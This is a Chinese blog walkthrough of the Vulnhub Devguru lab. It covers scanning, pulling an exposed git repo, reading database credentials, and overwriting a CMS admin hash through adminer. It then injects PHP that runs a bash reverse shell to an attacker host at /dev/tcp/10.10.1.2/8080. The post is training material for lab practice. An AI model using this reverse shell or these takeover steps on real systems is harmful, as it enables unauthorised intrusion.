@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub Devguru - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.68 Host is up (0.0068s latency). 机器 IP 为 10.1.1.68： 可能机器出现了一些问题，后续过程全部以 IP 为 79 进行" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/vulnhub-devguru/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub Devguru" />
+<meta property="og:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.68 Host is up (0.0068s latency). 机器 IP 为 10.1.1.68： 可能机器出现了一些问题，后续过程全部以 IP 为 79 进行" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/vulnhub-devguru/" />
+<meta property="article:published_time" content="2021-06-22T22:36:14+08:00" />
+<meta property="article:modified_time" content="2021-06-22T22:36:14+08:00" />
+<meta itemprop="name" content="Vulnhub Devguru">
+<meta itemprop="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.68 Host is up (0.0068s latency). 机器 IP 为 10.1.1.68： 可能机器出现了一些问题，后续过程全部以 IP 为 79 进行">
+<meta itemprop="datePublished" content="2021-06-22T22:36:14+08:00" />
+<meta itemprop="dateModified" content="2021-06-22T22:36:14+08:00" />
+<meta itemprop="wordCount" content="1944">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub Devguru"/>
+<meta name="twitter:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.68 Host is up (0.0068s latency). 机器 IP 为 10.1.1.68： 可能机器出现了一些问题，后续过程全部以 IP 为 79 进行"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Josephine&#39;s Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Josephine&#39;s Blog</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub Devguru</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-22 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#枚举">枚举</a>
+      <ul>
+        <li><a href="#确定-ip-地址">确定 IP 地址</a></li>
+        <li><a href="#端口扫描及服务枚举">端口扫描及服务枚举</a></li>
+        <li><a href="#80-端口枚举">80 端口枚举</a></li>
+        <li><a href="#8585-端口枚举">8585 端口枚举</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞搜索">漏洞搜索</a>
+      <ul>
+        <li><a href="#october-cms-469">October CMS 469</a></li>
+        <li><a href="#gitea-1125">Gitea 1.12.5</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-shell">Initial Shell</a></li>
+    <li><a href="#提权">提权</a>
+      <ul>
+        <li><a href="#提升为-frank">提升为 frank</a></li>
+        <li><a href="#提升为-root">提升为 root</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="枚举">枚举</h1>
+<h2 id="确定-ip-地址">确定 IP 地址</h2>
+<p>使用 nmap 进行探活：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sn 10.1.1.0/24
+
+Nmap scan report <span class="k">for</span> 10.1.1.68
+Host is up <span class="o">(</span>0.0068s latency<span class="o">)</span>.</code></pre></td></tr></table>
+</div>
+</div>
+<p>机器 IP 为 <strong>10.1.1.68</strong>：</p>
+<p><img src="/images/2021-06-23/login.png" alt="login"></p>
+<p>可能机器出现了一些问题，后续过程全部以 IP 为 79 进行。</p>
+<h2 id="端口扫描及服务枚举">端口扫描及服务枚举</h2>
+<p>首先进行全 TCP 端口的 SYN 扫描，发现开放 TCP 端口 22，80，8585：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sS -p- -oA tcp_full_port 10.1.1.68
+
+Not shown: <span class="m">65532</span> closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8585/tcp open  unknown</code></pre></td></tr></table>
+</div>
+</div>
+<p>枚举 banner 及服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -sC -p22,80,8585 -oA tcp_banner_services 10.1.1.68
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-generator: DevGuru
+<span class="p">|</span> http-git: 
+<span class="p">|</span>   10.1.1.68:80/.git/
+<span class="p">|</span>     Git repository found!
+<span class="p">|</span>     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">&#39;description&#39;</span> to name the...
+<span class="p">|</span>     Last commit message: first commit 
+<span class="p">|</span>     Remotes:
+<span class="p">|</span>       http://devguru.local:8585/frank/devguru-website.git
+<span class="p">|</span>_    Project type: PHP application <span class="o">(</span>guessed from .gitignore<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Corp - DevGuru
+8585/tcp open  unknown
+<span class="p">|</span> fingerprint-strings: 
+<span class="p">|</span>   GenericLines: 
+<span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+<span class="p">|</span>     Connection: close
+<span class="p">|</span>     Request
+<span class="p">|</span>   GetRequest: 
+<span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+<span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+<span class="p">|</span>     Set-Cookie: <span class="nv">lang</span><span class="o">=</span>en-US<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span><span class="m">2147483647</span>
+<span class="p">|</span>     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>a7e6a10e20718916<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+<span class="p">|</span>     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>2TfVa1MXvimyuWQfBHFzGWhct-86MTYyNDM1NTAxOTA3ODQyNDE2OQ<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Wed, <span class="m">23</span> Jun <span class="m">2021</span> 09:43:39 GMT<span class="p">;</span> HttpOnly
+<span class="p">|</span>     X-Frame-Options: SAMEORIGIN
+<span class="p">|</span>     Date: Tue, <span class="m">22</span> Jun <span class="m">2021</span> 09:43:39 GMT
+<span class="p">|</span>     &lt;!DOCTYPE html&gt;
+<span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en-US&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;theme-&#34;</span>&gt;
+<span class="p">|</span>     &lt;head data-suburl<span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
+<span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
+<span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+<span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
+<span class="p">|</span>     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
+<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;manifest&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/manifest.json&#34;</span> <span class="nv">crossorigin</span><span class="o">=</span><span class="s2">&#34;use-credentials&#34;</span>&gt;
+<span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;theme-color&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;#6cc644&#34;</span>&gt;
+<span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;author&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+<span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;description&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea (Git with a cup of tea) is a painless
+</span><span class="s2">|   HTTPOptions: 
+</span><span class="s2">|     HTTP/1.0 404 Not Found
+</span><span class="s2">|     Content-Type: text/html; charset=UTF-8
+</span><span class="s2">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+</span><span class="s2">|     Set-Cookie: i_like_gitea=91a0ab18fb69dba8; Path=/; HttpOnly
+</span><span class="s2">|     Set-Cookie: _csrf=ftXNIPee_3d51SF0dBboLTTY-346MTYyNDM1NTAxOTEyODM1MDc5NQ; Path=/; Expires=Wed, 23 Jun 2021 09:43:39 GMT; HttpOnly
+</span><span class="s2">|     X-Frame-Options: SAMEORIGIN
+</span><span class="s2">|     Date: Tue, 22 Jun 2021 09:43:39 GMT
+</span><span class="s2">|     &lt;!DOCTYPE html&gt;
+</span><span class="s2">|     &lt;html lang=&#34;</span>en-US<span class="s2">&#34; class=&#34;</span>theme-<span class="s2">&#34;&gt;
+</span><span class="s2">|     &lt;head data-suburl=&#34;&#34;&gt;
+</span><span class="s2">|     &lt;meta charset=&#34;</span>utf-8<span class="s2">&#34;&gt;
+</span><span class="s2">|     &lt;meta name=&#34;</span>viewport<span class="s2">&#34; content=&#34;</span><span class="nv">width</span><span class="o">=</span>device-width, initial-scale<span class="o">=</span>1<span class="s2">&#34;&gt;
+</span><span class="s2">|     &lt;meta http-equiv=&#34;</span>x-ua-compatible<span class="s2">&#34; content=&#34;</span><span class="nv">ie</span><span class="o">=</span>edge<span class="s2">&#34;&gt;
+</span><span class="s2">|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
+</span><span class="s2">|     &lt;link rel=&#34;</span>manifest<span class="s2">&#34; href=&#34;</span>/manifest.json<span class="s2">&#34; crossorigin=&#34;</span>use-credentials<span class="s2">&#34;&gt;
+</span><span class="s2">|     &lt;meta name=&#34;</span>theme-color<span class="s2">&#34; content=&#34;</span><span class="c1">#6cc644&#34;&gt;</span>
+<span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;author&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+<span class="p">|</span>_    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;description&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea (Git with a c</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>最后，20 个常用 UDP 端口扫描，无额外发现：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sU -sV -sC --top-ports <span class="m">20</span> -oA udp_20_ports 10.1.1.68
+
+PORT      STATE         SERVICE      VERSION
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open<span class="p">|</span>filtered dhcpc
+69/udp    closed        tftp
+123/udp   closed        ntp
+135/udp   closed        msrpc
+137/udp   open<span class="p">|</span>filtered netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   open<span class="p">|</span>filtered netbios-ssn
+161/udp   open<span class="p">|</span>filtered snmp
+162/udp   closed        snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open<span class="p">|</span>filtered isakmp
+514/udp   closed        syslog
+520/udp   closed        route
+631/udp   open<span class="p">|</span>filtered ipp
+1434/udp  closed        ms-sql-m
+1900/udp  closed        upnp
+4500/udp  open<span class="p">|</span>filtered nat-t-ike
+49152/udp closed        unknown</code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="80-端口枚举">80 端口枚举</h2>
+<p>访问主页，借助 Wappanalyzer 了解到其使用了 <strong>October CMS</strong>，版本尚不明确：</p>
+<p><img src="/images/2021-06-23/index.png" alt="index"></p>
+<p>其管理页面的 URL 为 /backend：</p>
+<p><img src="/images/2021-06-23/backend.png" alt="backend"></p>
+<p>结合之前 nmap 服务枚举的输出，在 /etc/hosts 中为 IP <strong>10.1.1.68</strong> 添加域名 <strong>devguru.local</strong>。同时该输出揭示了整个项目目录暴露在了 Web 服务器之下，使用 <strong>gitjacker</strong> 拉下整个项目：</p>
+<p><img src="/images/2021-06-23/gitjacker.png" alt="gitjacker"></p>
+<p>然后就是代码审计了，config 目录下的 database.php 中包含了数据库的凭据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="s1">&#39;mysql&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+    <span class="s1">&#39;driver&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;mysql&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;engine&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;InnoDB&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;host&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;port&#39;</span>       <span class="o">=&gt;</span> <span class="mi">3306</span><span class="p">,</span>
+    <span class="s1">&#39;database&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;octoberdb&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;username&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;october&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;password&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;SQ66EBYx4GT3byXH&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;charset&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;utf8mb4&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;collation&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;utf8mb4_unicode_ci&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;prefix&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;varcharmax&#39;</span> <span class="o">=&gt;</span> <span class="mi">191</span><span class="p">,</span>
+<span class="p">],</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>storage 目录下的 system.json 中发现版本号：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;build&#34;</span><span class="p">:</span><span class="mi">469</span><span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>同时根目录下存在 <strong>adminer.php</strong> 文件，经过查阅发现是类似 <strong>phpmyadmin</strong> 的管理工具，访问 <a href="http://devguru.local/adminer.php">http://devguru.local/adminer.php</a>：</p>
+<p><img src="/images/2021-06-22/adminer.png" alt="adminer"></p>
+<p>利用刚才获得的凭据登录，在 backend_users 表中发现 cms 存储的用户及 hash：</p>
+<p><img src="/images/2021-06-22/backend_users.png" alt="backend_users"></p>
+<h2 id="8585-端口枚举">8585 端口枚举</h2>
+<p>通过浏览器访问，发现其背后运行着 <strong>gitea</strong>：</p>
+<p><img src="/images/2021-06-23/gitea.png" alt="gitea"></p>
+<p>其版本为 <strong>1.12.5</strong>，发现一个用户 frank：</p>
+<p><img src="/images/2021-06-23/frank.png" alt="frank"></p>
+<h1 id="漏洞搜索">漏洞搜索</h1>
+<h2 id="october-cms-469">October CMS 469</h2>
+<p>Exploits: No Results</p>
+<p>Shellcodes: No Results</p>
+<h2 id="gitea-1125">Gitea 1.12.5</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Exploit Title</th>
+<th style="text-align:left">Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Gitea 1.12.5 - Remote Code Execution (Authenticated)</td>
+<td style="text-align:left">multiple/webapps/49571.py</td>
+</tr>
+</tbody>
+</table>
+<h1 id="initial-shell">Initial Shell</h1>
+<p>接着刚才发现的 CMS 用户表，通过 hashid 发现 hash 所用算法应该为 bcrypt，john 破解时也佐证了这一点。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">hashid
+<span class="nv">$2</span>y<span class="nv">$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK</span>
+
+Analyzing <span class="s1">&#39;$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Blowfish<span class="o">(</span>OpenBSD<span class="o">)</span> 
+<span class="o">[</span>+<span class="o">]</span> Woltlab Burning Board 4.x 
+<span class="o">[</span>+<span class="o">]</span> bcrypt </code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="/images/2021-06-23/john.png" alt="john"></p>
+<p>破解一会后实在无望，接着尝试通过覆盖 hash 的方式进入后台。首先利用 htpasswd 生成 hash，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">htpasswd -bnBC <span class="m">10</span> <span class="s2">&#34;&#34;</span> haha
+
+:<span class="nv">$2</span>y<span class="nv">$10$42</span>jey6B2Rik7y7psL9fHP.qArZJ.ioDYmZ1yLNEFXXbpvgnF/hmJW</code></pre></td></tr></table>
+</div>
+</div>
+<p>这里 &quot;&quot; 指代的是用户名，结果中有一个“:”，由于用户名为空，故冒号前并无内容，修改 password 字段的值并保存：</p>
+<p><img src="/images/2021-06-23/change.png" alt="change"></p>
+<p>利用用户名 &ldquo;frank&rdquo; 和密码 &ldquo;haha&rdquo; 成功登录进后台：</p>
+<p><img src="/images/2021-06-23/cms_backend.png" alt="cms_backend"></p>
+<p>这里稍稍研究了以下怎么才能执行任意 php 代码，由于 cms 版本很新，直接上传 webshell 过滤已经比较严格了，尝试一会无果，放弃。</p>
+<p><img src="/images/2021-06-23/upload.png" alt="upload"></p>
+<p>转之直接修改 cms 的页面，这里需要注意的是编辑的页面并非原始页面，会经过额外的处理，刚开始直接在 <strong>Markup</strong> 窗口中写入 php 语句但不生效。后查看 October CMS 的文档，代码逻辑需写在 <strong>Code</strong> 内，且逻辑必须封装在函数内（直接写 php 语句报错发现的）。</p>
+<p>这里我选择修改 <strong>about</strong>，先尝试执行 phpinfo：</p>
+<p><img src="/images/2021-06-23/about.png" alt="about"></p>
+<p>访问 about 页面，成功执行：</p>
+<p><img src="/images/2021-06-23/phpinfo.png" alt="phpinfo"></p>
+<p>写入一个 bash 反弹shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">onStart</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;exec bash -c &#39;bash -i &gt;/dev/tcp/10.10.1.2/8080 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>nc 监听本地 8080 端口，访问 about 页面，成功获取 Initial Shell！</p>
+<p><img src="/images/2021-06-23/initial.png" alt="initial"></p>
+<h1 id="提权">提权</h1>
+<h2 id="提升为-frank">提升为 frank</h2>
+<p>经过一番枚举，发现 gitea 以 frank 用户运行，webshell 的用户 www-data，且 gitea 1.12.5 存在一个 RCE 漏洞。发现 gitea 配置文件的本分 /var/backup/app.ini.bak，其中有关数据库的部分：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-ini" data-lang="ini"><span class="k">[database]</span>
+<span class="na">DB_TYPE</span>             <span class="o">=</span> <span class="s">mysql</span>
+<span class="na">HOST</span>                <span class="o">=</span> <span class="s">127.0.0.1:3306</span>
+<span class="na">NAME</span>                <span class="o">=</span> <span class="s">gitea</span>
+<span class="na">USER</span>                <span class="o">=</span> <span class="s">gitea</span>
+<span class="na">PASSWD</span>              <span class="o">=</span> <span class="s">UfFPTF8C8jjxVF2m</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>继续使用 adminer.php 来访问数据库，user 表中包含了账户信息：</p>
+<p><img src="/images/2021-06-23/user.png" alt="user"></p>
